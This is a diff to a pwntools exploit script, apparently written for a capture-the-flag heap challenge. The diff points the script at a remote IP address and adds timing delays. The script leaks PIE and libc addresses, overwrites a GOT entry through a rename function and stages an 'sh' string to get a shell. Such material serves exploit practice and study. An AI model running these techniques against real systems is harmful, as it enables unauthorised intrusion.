@@ -5,7 +5,7 @@ from time import sleep
 context.arch = "amd64"
 exe = ELF("./main")
 libc = exe.libc
-host, port = "localhost", 12001 
+host, port = "20.224.160.150", 12001 
 if args.REMOTE:
     p = remote(host,port)
 elif args.GDB:
@@ -23,6 +23,7 @@ def view():
 
 def adopt(idx, size, name):
     p.sendlineafter(b'> ', b'1')
+    sl(0.5)
     p.sendline(idx)
     p.sendlineafter(b'size: ', size)
     p.sendafter(b'Pet name: ', name)
@@ -33,11 +34,11 @@ def ret(idx):
 
 def rename(idx, newname):
     p.sendlineafter(b'> ', b'3')
-    sleep(0.5)
+    sl(0.5)
     p.sendline(idx)
-    sleep(0.5)
+    sl(0.5)
     p.send(newname)
-
+sl = lambda x:sleep(x)
 #pie_leak 
 adopt(b'19', b'41', b'B'*41)
 view()
@@ -76,9 +77,11 @@ puts_plt = pie + 0x1040
 memset_got = pie + 0x4028
 
 adopt(b'11', b'50', b'grgr')
+sl(0.5)
 adopt(b'12', b'50', b'sh\0')
+sl(0.5)
 rename(b'14', p64(memset_got))
-
+sl(0.5)
 view()
 p.recvuntil(b"[11] ")
 libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x199340
